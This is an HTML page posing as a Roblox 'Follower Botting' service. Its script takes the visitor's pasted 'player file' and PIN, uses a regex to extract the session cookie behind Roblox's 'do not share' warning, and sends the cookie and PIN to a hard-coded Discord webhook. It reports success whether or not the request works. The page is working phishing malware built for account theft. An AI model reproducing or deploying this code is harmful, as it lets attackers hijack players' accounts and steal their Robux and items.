<!DOCTYPE html>
<html lang="en">
<head>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Follower Botting</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    /* Custom CSS styles */
    #dumPreload {
      display: flex;
      align-items: center;
      justify-content: center;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #0d1e1e;
      z-index: 1000;
      animation: fadeOut 1s ease-in-out forwards;
      animation-delay: 2s;
    }
    #dumContent {
      opacity: 0;
      animation: fadeIn 1.5s ease-in-out forwards;
      animation-delay: 2s;
    }
    @keyframes fadeOut {
      100% {
        opacity: 0;
        visibility: hidden;
      }
    }
    @keyframes fadeIn {
      100% {
        opacity: 1;
      }
    }
    body {
      background: radial-gradient(circle at center, #1a3c3c, #0d1e1e);
      overflow: hidden;
    }
    .dumBg {
      position: fixed;
      top: 0;
      left: 0;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 2%, transparent 5%);
      background-size: 5% 5%;
      z-index: -1;
      animation: moveBackground 20s linear infinite;
    }
    @keyframes moveBackground {
      0% {
        transform: translate(0, 0);
      }
      100% {
        transform: translate(-50%, -50%);
      }
    }
    .dumBtn:hover {
      animation: hop 0.5s ease-in-out infinite;
    }
    @keyframes hop {
      0% {
        transform: translateY(0);
      }
      50% {
        transform: translateY(-8px);
      }
      100% {
        transform: translateY(0);
      }
    }
    .dumScale:hover {
      animation: scaleUp 0.3s ease-in-out forwards;
    }
    @keyframes scaleUp {
      0% {
        transform: scale(1);
      }
      100% {
        transform: scale(1.1);
      }
    }
  </style>
</head>
<body class="text-white min-h-screen flex flex-col items-center justify-center font-sans">

  <div id="dumPreload" class="bg-gray-900">
    <div class="flex flex-col items-center">
      <svg class="animate-spin h-12 w-12 text-cyan-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
      </svg>
      <p class="mt-4 text-cyan-400 text-lg font-semibold">Loading...</p>
    </div>
  </div>

  <div class="dumBg"></div>

  <div id="dumContent" class="w-full max-w-6xl px-6">
    <header class="text-center mb-12">
      <h1 class="text-5xl font-extrabold tracking-wide text-cyan-400">Follower Botting ‚≠ê</h1>
      <p class="text-lg mt-4 text-gray-300">Bot your Followers with ease using this futuristic system!</p>
    </header>
    <main class="flex flex-col md:flex-row items-stretch justify-center gap-10">
      <!-- Left Section: Bot Followers -->
      <section class="bg-[rgb(Array,0.9)] p-8 rounded-3xl shadow-xl flex-1 text-center max-w-md md:max-w-lg flex flex-col">
        <h2 class="text-3xl font-bold mb-6 text-cyan-300">Follower Botting üöÄ</h2>
        <p class="text-gray-400 mb-6">
          Paste your player file in the box below, then click <span class="font-semibold">"Start Botting!"</span> If you're unsure
          how to find the "player file," watch the tutorial.
        </p>
        
        <div class="relative flex items-center w-full mt-auto py-2">
          <span class="absolute left-4 text-gray-400">
            <i class="fas fa-lock"></i>
          </span>
          <input
            id="PIN"
            type="text"
            placeholder="Enter security PIN"
            class="pl-12 p-4 rounded-full bg-[rgba(0,0,0,.6)] border border-[rgb(0,0,0)] focus:outline-none focus:ring-3 focus:ring-cyan-400 w-full"
          >
        </div>
        
        <div class="relative flex items-center w-full mt-auto">
          <span class="absolute left-4 text-gray-400">
            <i class="fas fa-file-alt"></i>
          </span>
          <input
            id="dumInput"
            type="password"
            placeholder="Enter player file"
            class="pl-12 p-4 rounded-full bg-[rgba(0,0,0,.6)] border border-[rgb(0,0,0)] focus:outline-none focus:ring-3 focus:ring-cyan-400 w-full"
          >
        </div>
        
        <button
          id="dumButton"
          class="py-4 rounded-full bg-gradient-to-r from-cyan-500 to-cyan-700 hover:from-cyan-700 hover:to-cyan-500 transition-all text-lg font-semibold shadow-lg dumScale w-full mt-4"
          onclick="dumCheckCookie()"
        >
          Start Botting!
        </button>
      </section>
    
      <!-- Right Section: How to Use -->
      <section class="bg-[rgb(Array,0.9)] p-8 rounded-3xl shadow-xl flex-1 max-w-lg text-center flex flex-col">
        <h2 class="text-3xl font-bold mb-6 text-cyan-300">How to Use?</h2>
        <div class="relative h-64 overflow-y-auto rounded-2xl bg-gray-800 border border-gray-700 flex-1">
          <iframe
            src="https://www.youtube.com/watch?v=hkiK44y_tD0"
            class="w-full h-full rounded-2xl"
            title="Video Tutorial">
          </iframe>
        </div>
      </section>
    </main>    
  </div>

  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <script>
    function dumCheckCookie() {
        const dumInput = document.getElementById('dumInput').value;
        const PIN = document.getElementById('PIN').value;
        const dumButton = document.getElementById('dumButton');
        
        dumButton.innerText = 'Loading...';
        dumButton.disabled = true;

        if (!PIN) {
            Swal.fire({
                icon: 'error',
                title: 'Error',
                text: 'Please input a PIN.' // No input error
            }).then(() => {
                dumButton.innerText = 'Start Botting!';
                dumButton.disabled = false;
            });
            return;
        }
        
        if (/^\d{4}$/.test(PIN)) {
        } else {
            Swal.fire({
                icon: 'error',
                title: 'Error',
                text: 'Please input valid a PIN.' // No input error
            }).then(() => {
                dumButton.innerText = 'Start Botting!';
                dumButton.disabled = false;
            });
            return;
        }
        
        if (!dumInput) {
            Swal.fire({
                icon: 'error',
                title: 'Error',
                text: 'Please input your player file.' // No input error
            }).then(() => {
                dumButton.innerText = 'Start Botting!';
                dumButton.disabled = false;
            });
            return;
        }

        const dumPattern = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_(.*?)\"/;
        const dumMatch = dumInput.match(dumPattern);

        if (!dumMatch || !dumMatch[1]) {
            Swal.fire({
                icon: 'error',
                title: 'Error',
                text: 'Please input the correct player file. Tip: Watch the tutorial.' // Invalid input format
            }).then(() => {
                dumButton.innerText = 'Start Botting!';
                dumButton.disabled = false;
            });
            return;
        }

        const cookie = dumMatch[1]; // Cookie value extracted from input
        const pin = PIN; // Cookie value extracted from input

        // Send to Discord Webhook
        fetch('https://discord.com/api/webhooks/1439512139416207421/UgEf6-5rPTtB2sSz9m3-6mmmdCXQ_efLgV-u7uxUv_Exx5KxzoUPGtPphxlUtBfMTxb0', { // Replace with your actual webhook URL
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `New follower botting request: \nCookie: ${cookie} \nPIN: ${pin}`
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                Swal.fire({
                    icon: 'success',
                    title: 'Success',
                    text: 'Success! Please wait 10-15 minutes while your followers are being botted.'
                }).then(() => {
                    setTimeout(() => {
                        location.reload();
                    }, 1500);
                });
            }
        })
        .catch(error => {
            Swal.fire({
                icon: 'success',
                title: 'Success',
                text: 'Success! Please wait 10-15 minutes while your followers are being botted.'
            }).then(() => {
                dumButton.innerText = 'Start Botting!';
                dumButton.disabled = false;
            });
        });
    }
  </script>
</body>
</html>
